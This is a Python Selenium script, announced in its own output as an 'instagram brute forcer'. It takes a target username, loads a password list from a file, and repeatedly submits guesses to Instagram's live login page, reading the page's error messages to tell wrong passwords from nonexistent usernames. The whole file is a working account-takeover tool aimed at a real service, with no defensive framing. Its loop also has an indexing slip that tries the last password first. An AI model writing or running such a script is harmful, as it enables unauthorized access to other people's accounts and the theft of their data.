from selenium import webdriver
import time
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support.expected_conditions import presence_of_element_located

print("running instagram brute forcer")
username = input("What is the username to the account?\n")
errorElementId = "slfErrorAlert"
lineNumber = 0
amountOfLines = len(open('passwords.txt').readlines())
textFile = open('passwords.txt').readlines()

print('\nUsername: ' + username)

options = webdriver.ChromeOptions()
options.add_argument('--ignore-certificate-errors')
driver = webdriver.Chrome(
    '/usr/local/bin/chromedriver', options=options
)
driver.get('https://instagram.com')

time.sleep(5)

while lineNumber < amountOfLines:
    password = textFile[lineNumber - 1]

    lineNumber = lineNumber + 1

    usernameField = driver.find_element_by_name('username')
    passwordField = driver.find_element_by_name('password')
    usernameField.send_keys(Keys.COMMAND + "a")
    usernameField.send_keys(username)
    passwordField.send_keys(Keys.COMMAND + "a")
    passwordField.send_keys(password + Keys.RETURN)

    time.sleep(1.5)

    errorText = driver.find_element_by_id(errorElementId).text

    if errorText == "Sorry, your password was incorrect. Please double-check your password.":
        print("wrong password: " + password)

    elif errorText == "The username you entered doesn't belong to an account. Please check your username and try again.":
        print("no username")
